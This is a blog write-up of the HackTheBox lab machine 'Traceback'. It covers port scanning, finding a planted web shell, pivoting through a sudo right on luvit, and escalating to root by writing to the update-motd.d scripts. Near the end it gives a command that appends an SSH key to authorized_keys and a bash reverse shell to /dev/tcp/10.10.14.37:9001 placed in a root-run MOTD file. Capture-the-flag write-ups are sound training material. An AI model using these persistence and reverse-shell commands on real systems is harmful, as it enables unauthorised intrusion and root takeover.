---
layout: single
title: Traceback Write-Up - HackTheBox
excerpt: "Traceback was an easy-rated, Linux machine made by Xh4H on HackTheBox that allowed some Lua interaction and unique escalation vector."
classes: wide
categories: [hackthebox]
date: 2020-08-15
tags: [hackthebox, hacking, penetration testing, write-ups, linux]
header:
  teaser: \assets\images\htb\traceback\banner-traceback.png
  teaser_home_page: true
toc: true
toc_label: "Table of Contents"
toc_icon: "book-dead"  # corresponding Font Awesome icon name (without fa prefix)
# toc_sticky: true
---
![](\assets\images\htb\traceback\banner-traceback.png)
## Summary
Traceback was an easy-rated, Linux machine made by Xh4H on HackTheBox that allowed some Lua interaction and unique escalation of privileges. The port scan showed SSH and an Apache server running on port 80. Looking at the web server, it showed a compromised web page with an interesting comment in the source code referring to the "best web shells you might need." Googling that comment revealed a Github repository with various webshells. I created a wordlist with the names of the webshells and did a quick enum of the root directory of the server and it revealed an active web shell. Utilizing the web shell, I uploaded and executed my own php reverse shell as not to disturb other HackTheBox members. Logged in as the `webadmin` user I quickly discovered that I had sudo privilege to run `/home/sysadmin/luvit` as the `sysadmin` user, which allowed execution of bash as that user. Continuing on I noticed an interesting update to `/etc/update-motd.d/` being by root. That, coupled with an interesting set of group permissions that allowed the sysadmin user to write to `/etc/update-motd.d/` I began to explore a vector. The update-motd.d scripts are executed by the root user at each interactive shell login. Therefore, since we have write ability to those files, we could essentially execute a command as the root user once triggering a login. I echo'd in a public key into sysadmin's authorized_keys file to be able to trigger a login and echo'd in a simple bash reverse shell in the `/etc/update-motd.d/00-header` file. I set up a listener and logged in via SSH to sysadmin triggering a shell as root on my listener.

## Nmap Port Scan
`nmap -sCV -Pn -n -p- -T4 -oN nmap/full-traceback 10.10.10.181`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 15:41 EDT
Nmap scan report for 10.10.10.181
Host is up (0.027s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Web Enumeration

Rustbuster revealed a shell.php file (at the time I didn't realize it was another HTB member). Essentially, nothing useful here.
`/opt/rustbuster/rustbuster dir -u http://10.10.10.181/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php`
![](\assets\images\htb\traceback\rustbuster-traceback.png)

A look at the pwned web page telling us he left a backdoor. How Nice!
![](\assets\images\htb\traceback\pwnd-page.png)

Interesting comment left in the source code:
![](\assets\images\htb\traceback\source-code-comment.png)

Searching Google for the string `Some of the best web shells that you might need` reveals a Github repository with… you guessed it - Web Shells! [https://github.com/TheBinitGhimire/Web-Shells](https://github.com/TheBinitGhimire/Web-Shells)

I compiled a list of the filenames of the web-shells and ran it through rustbuster: 
![](\assets\images\htb\traceback\webshell-rustbuster.png)

Going to the shell, we get a login prompt.
![](\assets\images\htb\traceback\smevk-login.png)

Browsing the source code of the web-shell, the creds are admin/admin. It appears other HTB users are here, so not to disturb I will upload my own reverse TCP PHP script to get a shell.
![](\assets\images\htb\traceback\smevk-logged-in.png)

## Initial Access
Browsing to my shell to execute, we get a return on the listener.
![](\assets\images\htb\traceback\webadmin-shell.png)

As a quick win, I always check sudo permissions of the user I'm logged in as.
![](\assets\images\htb\traceback\webadmin-sudo-perm.png)

Ah, a note left for us. How considerate!
![](\assets\images\htb\traceback\webadmin-note.png)

## Pivoting To SysAdmin
Between the note and the discovered sudo permission, we can use Luvit to execute a shell as the sysadmin user.
![](\assets\images\htb\traceback\sysadmin-lua-shell.png)

Reference for os.execute: [http://lua-users.org/wiki/OsLibraryTutorial](http://lua-users.org/wiki/OsLibraryTutorial)

This allowed us to capture the user flag.
![](\assets\images\htb\traceback\user-flag.png)

During enumeration with linPEAS the first thing I noticed was Root was running this command:

`root /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/`

In addition we had some interesting permissions:
![](\assets\images\htb\traceback\linpeas-traceback.png)

According to Ubuntu, the update-motd.d scripts are executed by the root user at each interactive shell login. Therefore, since we have write ability to those files, we could essentially execute a command as the root user once triggering a login.
Ref: [http://manpages.ubuntu.com/manpages/trusty/man5/update-motd.5.html](http://manpages.ubuntu.com/manpages/trusty/man5/update-motd.5.html)

The first thing I did was establish the ability to easily log in by adding a public key to Sysadmin's authorized_keys.
```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSNvfyEGfS+x+g6G7FLv9bVfvOOmfQC9Ot7P/IxDaSKKVsU8fbebwLBw+Ts2QyLAqejmCauO8Rc5vi1opAuFF/a6rIfduXO1BUSDtvbQQ9Qz3JEmSILUL3N8doPEVjAooGH04IPL4++ObrbKkkrRLmicVJHYTehlYhUTtVhcgVLN9wqJgkRYeSDu/EBSrWBZuulzGwpXYH8mG3KjWHK+5E0PZLyYWIdIiOLHVDPgAWH++agnnz7Jei8YhBt6FoJMHFZtUQ0jM1jmSCLoKGO2GAeD0+KQFfuXlf3Z5JH527v89vFJWBTRkFyuGjTDoEU07qZPSYcmnxPStiJmDHZMMvQiF9lYOadq1MnDG36SAFAFs78/gJI9Apybn78peXSD9auqoQ73LBn9SwUiHcA1/rExmD9jCA82sQjltpwHyl5bSH4/VgaJl41w9GaF+puz+rdBfikxz8GCDpQZxSgSpzIMY6IwyPWF6uH1HJLhG5oXrvfsCXMYL/kc2+7hXo6Y0= kali@kali" >> /home/sysadmin/.ssh/authorized_keys
```
## And We're Root
Next, I set up a netcat listener on port 9001. I echo'd a Bash Reverse Shell into the 00-header file, and logged in via SSH with Sysadmin to trigger the MOTD execution. And it worked!

`echo "bash -c 'bash -i >& /dev/tcp/10.10.14.37/9001 0>&1'" >> /etc/update-motd.d/00-header`
![](\assets\images\htb\traceback\root-flag.png)